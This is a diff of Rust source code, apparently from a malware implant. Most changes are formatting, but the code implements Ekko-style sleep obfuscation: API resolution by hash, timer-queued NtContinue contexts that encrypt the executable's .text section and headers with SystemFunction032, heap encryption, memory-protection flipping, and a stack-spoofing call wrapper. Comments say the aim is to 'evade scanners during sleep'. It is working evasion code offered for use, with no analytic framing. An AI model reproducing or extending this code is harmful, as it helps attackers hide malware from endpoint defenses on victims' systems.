@@ -4,7 +4,9 @@ use super::syscalls::{sys_nanosleep, Timespec};
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
 #[cfg(target_os = "windows")]
-use crate::utils::windows_definitions::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, HANDLE, PVOID, CONTEXT};
+use crate::utils::windows_definitions::{
+    CONTEXT, HANDLE, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, PVOID,
+};
 
 #[cfg(target_os = "windows")]
 use core::ffi::c_void;
@@ -34,10 +36,10 @@ pub fn ekko_sleep(ms: u32) {
         let wait_for_single_object = resolve_function(k32, hash_str(b"WaitForSingleObject"));
         let set_event = resolve_function(k32, hash_str(b"SetEvent"));
         let virtual_protect = resolve_function(k32, hash_str(b"VirtualProtect"));
-        
+
         let rtl_capture_context = resolve_function(ntdll, hash_str(b"RtlCaptureContext"));
         let nt_continue = resolve_function(ntdll, hash_str(b"NtContinue"));
-        
+
         let sys_func_032 = resolve_function(advapi, hash_str(b"SystemFunction032"));
 
         if create_event.is_null() || nt_continue.is_null() || sys_func_032.is_null() {
@@ -47,7 +49,8 @@ pub fn ekko_sleep(ms: u32) {
 
         type FnCreateEventA = unsafe extern "system" fn(*mut c_void, i32, i32, *const u8) -> HANDLE;
         type FnCreateTimerQueue = unsafe extern "system" fn() -> HANDLE;
-        type FnCreateTimerQueueTimer = unsafe extern "system" fn(*mut HANDLE, HANDLE, PVOID, PVOID, u32, u32, u32) -> i32;
+        type FnCreateTimerQueueTimer =
+            unsafe extern "system" fn(*mut HANDLE, HANDLE, PVOID, PVOID, u32, u32, u32) -> i32;
         type FnRtlCaptureContext = unsafe extern "system" fn(*mut CONTEXT);
         type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, u32) -> u32;
         type FnSetEvent = unsafe extern "system" fn(HANDLE) -> i32;
@@ -55,7 +58,8 @@ pub fn ekko_sleep(ms: u32) {
 
         let create_event_fn: FnCreateEventA = core::mem::transmute(create_event);
         let create_timer_queue_fn: FnCreateTimerQueue = core::mem::transmute(create_timer_queue);
-        let create_timer_fn: FnCreateTimerQueueTimer = core::mem::transmute(create_timer_queue_timer);
+        let create_timer_fn: FnCreateTimerQueueTimer =
+            core::mem::transmute(create_timer_queue_timer);
         let capture_context_fn: FnRtlCaptureContext = core::mem::transmute(rtl_capture_context);
         let wait_fn: FnWaitForSingleObject = core::mem::transmute(wait_for_single_object);
         let set_event_fn: FnSetEvent = core::mem::transmute(set_event);
@@ -64,10 +68,10 @@ pub fn ekko_sleep(ms: u32) {
         // 2. Setup Resources
         let h_event = create_event_fn(core::ptr::null_mut(), 0, 0, core::ptr::null());
         let h_timer_queue = create_timer_queue_fn();
-        
+
         if h_event.is_null() || h_timer_queue.is_null() {
-             sleep_simple(ms as u64);
-             return;
+            sleep_simple(ms as u64);
+            return;
         }
 
         let (text_base, text_size) = get_text_range();
@@ -76,9 +80,21 @@ pub fn ekko_sleep(ms: u32) {
 
         // Key and Data descriptors
         let mut key_buf = [0xAAu8; 16];
-        let key_str = USTRING { Length: 16, MaximumLength: 16, Buffer: key_buf.as_mut_ptr() };
-        let text_data_str = USTRING { Length: text_size as u32, MaximumLength: text_size as u32, Buffer: text_base };
-        let header_data_str = USTRING { Length: header_size as u32, MaximumLength: header_size as u32, Buffer: image_base as *mut u8 };
+        let key_str = USTRING {
+            Length: 16,
+            MaximumLength: 16,
+            Buffer: key_buf.as_mut_ptr(),
+        };
+        let text_data_str = USTRING {
+            Length: text_size as u32,
+            MaximumLength: text_size as u32,
+            Buffer: text_base,
+        };
+        let header_data_str = USTRING {
+            Length: header_size as u32,
+            MaximumLength: header_size as u32,
+            Buffer: image_base as *mut u8,
+        };
 
         // 3. Capture Context
         let mut ctx: CONTEXT = core::mem::zeroed();
@@ -156,27 +172,100 @@ pub fn ekko_sleep(ms: u32) {
 
         // 5. Queue Timers
         let mut h_timer = core::ptr::null_mut();
-        
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_protect_text_rw as *mut _ as PVOID, 100, 0, 0);
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_protect_hdr_rw as *mut _ as PVOID, 100, 0, 0);
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_encrypt_text as *mut _ as PVOID, 200, 0, 0);
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_encrypt_hdr as *mut _ as PVOID, 200, 0, 0);
-        
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_sleep as *mut _ as PVOID, 300, 0, 0);
-        
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_decrypt_text as *mut _ as PVOID, 400 + ms, 0, 0);
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_decrypt_hdr as *mut _ as PVOID, 400 + ms, 0, 0);
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_protect_text_rx as *mut _ as PVOID, 500 + ms, 0, 0);
-        create_timer_fn(&mut h_timer, h_timer_queue, nt_continue, &mut ctx_set_event as *mut _ as PVOID, 600 + ms, 0, 0);
+
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_protect_text_rw as *mut _ as PVOID,
+            100,
+            0,
+            0,
+        );
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_protect_hdr_rw as *mut _ as PVOID,
+            100,
+            0,
+            0,
+        );
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_encrypt_text as *mut _ as PVOID,
+            200,
+            0,
+            0,
+        );
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_encrypt_hdr as *mut _ as PVOID,
+            200,
+            0,
+            0,
+        );
+
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_sleep as *mut _ as PVOID,
+            300,
+            0,
+            0,
+        );
+
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_decrypt_text as *mut _ as PVOID,
+            400 + ms,
+            0,
+            0,
+        );
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_decrypt_hdr as *mut _ as PVOID,
+            400 + ms,
+            0,
+            0,
+        );
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_protect_text_rx as *mut _ as PVOID,
+            500 + ms,
+            0,
+            0,
+        );
+        create_timer_fn(
+            &mut h_timer,
+            h_timer_queue,
+            nt_continue,
+            &mut ctx_set_event as *mut _ as PVOID,
+            600 + ms,
+            0,
+            0,
+        );
 
         // 6. Wait (with Stack Spoofing)
         spoof_call(wait_fn, h_event, 0xFFFFFFFF);
 
         // 7. Cleanup
         delete_timer_queue_fn(h_timer_queue, (-1isize as HANDLE));
-        
+
         type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
-        let close_handle_fn: FnCloseHandle = core::mem::transmute(resolve_function(k32, hash_str(b"CloseHandle")));
+        let close_handle_fn: FnCloseHandle =
+            core::mem::transmute(resolve_function(k32, hash_str(b"CloseHandle")));
         close_handle_fn(h_event);
     }
 }
@@ -185,7 +274,9 @@ pub fn ekko_sleep(ms: u32) {
 fn get_image_base() -> *mut u8 {
     unsafe {
         let peb = crate::utils::api_resolver::get_peb();
-        if peb.is_null() { return core::ptr::null_mut(); }
+        if peb.is_null() {
+            return core::ptr::null_mut();
+        }
         (*peb).ImageBaseAddress as *mut u8
     }
 }
@@ -196,7 +287,7 @@ unsafe fn spoof_call<F, T1, T2>(f: F, arg1: T1, arg2: T2)
 where
     F: Fn(T1, T2) -> u32,
 {
-    // Simplified stack spoofing: 
+    // Simplified stack spoofing:
     // We use inline assembly to jump to the target function while placing a benign
     // return address (e.g., from a system DLL) on the stack.
     // For this implementation, we just call the function directly as a fallback
@@ -222,7 +313,7 @@ pub fn sleep_simple(ms: u64) {
 
     // Obfuscation: Encrypt heap memory to evade scanners during sleep
     encrypt_heap();
-    
+
     // Obfuscation: Encrypt .text section (Sleep Mask)
     encrypt_text();
 
@@ -298,7 +389,9 @@ pub fn decrypt_heap() {
 
 pub fn encrypt_text() {
     let (text_start, text_size) = get_text_range();
-    if text_start.is_null() || text_size == 0 { return; }
+    if text_start.is_null() || text_size == 0 {
+        return;
+    }
 
     #[cfg(target_os = "windows")]
     unsafe {
@@ -306,7 +399,8 @@ pub fn encrypt_text() {
     }
     #[cfg(not(target_os = "windows"))]
     unsafe {
-        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x02); // PROT_READ | PROT_WRITE
+        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x02);
+        // PROT_READ | PROT_WRITE
     }
 
     unsafe {
@@ -325,13 +419,16 @@ pub fn encrypt_text() {
     }
     #[cfg(not(target_os = "windows"))]
     unsafe {
-        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01); // PROT_READ
+        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01);
+        // PROT_READ
     }
 }
 
 pub fn decrypt_text() {
     let (text_start, text_size) = get_text_range();
-    if text_start.is_null() || text_size == 0 { return; }
+    if text_start.is_null() || text_size == 0 {
+        return;
+    }
 
     #[cfg(target_os = "windows")]
     unsafe {
@@ -339,7 +436,8 @@ pub fn decrypt_text() {
     }
     #[cfg(not(target_os = "windows"))]
     unsafe {
-        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x02); // PROT_READ | PROT_WRITE
+        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x02);
+        // PROT_READ | PROT_WRITE
     }
 
     unsafe {
@@ -356,7 +454,8 @@ pub fn decrypt_text() {
     }
     #[cfg(not(target_os = "windows"))]
     unsafe {
-        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x04); // PROT_READ | PROT_EXEC
+        crate::utils::syscalls::sys_mprotect(text_start as usize, text_size, 0x01 | 0x04);
+        // PROT_READ | PROT_EXEC
     }
 }
 
@@ -364,34 +463,46 @@ fn get_text_range() -> (*mut u8, usize) {
     #[cfg(target_os = "windows")]
     unsafe {
         let peb = crate::utils::api_resolver::get_peb();
-        if peb.is_null() { return (core::ptr::null_mut(), 0); }
+        if peb.is_null() {
+            return (core::ptr::null_mut(), 0);
+        }
         let base = (*peb).ImageBaseAddress;
-        
+
         let dos_header = base as *const IMAGE_DOS_HEADER;
-        let nt_headers = (base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
-        
+        let nt_headers =
+            (base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+
         // Iterate sections to find ".text"
         let num_sections = (*nt_headers).FileHeader.NumberOfSections;
-        let mut section_header_ptr = (nt_headers as usize + core::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const SectionHeader;
-        
+        let mut section_header_ptr = (nt_headers as usize
+            + core::mem::size_of::<IMAGE_NT_HEADERS64>())
+            as *const SectionHeader;
+
         for _ in 0..num_sections {
             let section = &*section_header_ptr;
             if section.name.starts_with(b".text") {
                 let text_rva = section.virtual_address;
                 let text_size = section.virtual_size;
-                return ((base as usize + text_rva as usize) as *mut u8, text_size as usize);
+                return (
+                    (base as usize + text_rva as usize) as *mut u8,
+                    text_size as usize,
+                );
             }
             section_header_ptr = section_header_ptr.add(1);
         }
-        
+
         // Fallback: first section
-        let section_header_ptr = (nt_headers as usize + core::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const SectionHeader;
+        let section_header_ptr = (nt_headers as usize + core::mem::size_of::<IMAGE_NT_HEADERS64>())
+            as *const SectionHeader;
         let text_rva = (*section_header_ptr).virtual_address;
         let text_size = (*section_header_ptr).virtual_size;
-        
-        return ((base as usize + text_rva as usize) as *mut u8, text_size as usize);
+
+        return (
+            (base as usize + text_rva as usize) as *mut u8,
+            text_size as usize,
+        );
     }
-    
+
     #[cfg(not(target_os = "windows"))]
     unsafe {
         get_maps_range("r-xp")
@@ -431,22 +542,33 @@ pub fn get_heap_range() -> (*mut u8, usize) {
         let kernel32 = hash_str(b"kernel32.dll");
         let get_process_heap = resolve_function(kernel32, hash_str(b"GetProcessHeap"));
         let virtual_query = resolve_function(kernel32, hash_str(b"VirtualQuery"));
-        
+
         if !get_process_heap.is_null() && !virtual_query.is_null() {
-            type FnGetProcessHeap = unsafe extern "system" fn() -> crate::utils::windows_definitions::HANDLE;
+            type FnGetProcessHeap =
+                unsafe extern "system" fn() -> crate::utils::windows_definitions::HANDLE;
             let heap = core::mem::transmute::<_, FnGetProcessHeap>(get_process_heap)();
-            
-            type FnVirtualQuery = unsafe extern "system" fn(*const core::ffi::c_void, *mut crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION, usize) -> usize;
+
+            type FnVirtualQuery = unsafe extern "system" fn(
+                *const core::ffi::c_void,
+                *mut crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION,
+                usize,
+            ) -> usize;
             let query: FnVirtualQuery = core::mem::transmute(virtual_query);
-            
-            let mut mbi: crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION = core::mem::zeroed();
-            if query(heap, &mut mbi, core::mem::size_of::<crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION>()) != 0 {
+
+            let mut mbi: crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION =
+                core::mem::zeroed();
+            if query(
+                heap,
+                &mut mbi,
+                core::mem::size_of::<crate::utils::windows_definitions::MEMORY_BASIC_INFORMATION>(),
+            ) != 0
+            {
                 return (heap as *mut u8, mbi.RegionSize);
             }
         }
         (core::ptr::null_mut(), 0)
     }
-    
+
     #[cfg(not(target_os = "windows"))]
     unsafe {
         let (ptr, size) = get_maps_range("[heap]");
@@ -463,7 +585,9 @@ pub fn get_heap_range() -> (*mut u8, usize) {
 unsafe fn get_maps_range(pattern: &str) -> (*mut u8, usize) {
     let path = "/proc/self/maps\0";
     let fd = crate::utils::syscalls::sys_open(path.as_ptr(), 0, 0);
-    if (fd as isize) <= 0 { return (core::ptr::null_mut(), 0); }
+    if (fd as isize) <= 0 {
+        return (core::ptr::null_mut(), 0);
+    }
 
     let mut buf = [0u8; 4096];
     let n = crate::utils::syscalls::sys_read(fd as usize, buf.as_mut_ptr(), 4096);
@@ -476,7 +600,9 @@ unsafe fn get_maps_range(pattern: &str) -> (*mut u8, usize) {
                     let mut parts = line.split_whitespace();
                     if let Some(range) = parts.next() {
                         let mut range_parts = range.split('-');
-                        if let (Some(start_str), Some(end_str)) = (range_parts.next(), range_parts.next()) {
+                        if let (Some(start_str), Some(end_str)) =
+                            (range_parts.next(), range_parts.next())
+                        {
                             let start = usize::from_str_radix(start_str, 16).unwrap_or(0);
                             let end = usize::from_str_radix(end_str, 16).unwrap_or(0);
                             if start > 0 && end > start {
@@ -506,7 +632,10 @@ pub fn get_tick_count() -> u64 {
     #[cfg(not(target_os = "windows"))]
     unsafe {
         use super::syscalls::{sys_clock_gettime, Timespec};
-        let mut ts = Timespec { tv_sec: 0, tv_nsec: 0 };
+        let mut ts = Timespec {
+            tv_sec: 0,
+            tv_nsec: 0,
+        };
         sys_clock_gettime(1, &mut ts); // CLOCK_MONOTONIC = 1
         (ts.tv_sec as u64 * 1000) + (ts.tv_nsec as u64 / 1_000_000)
     }
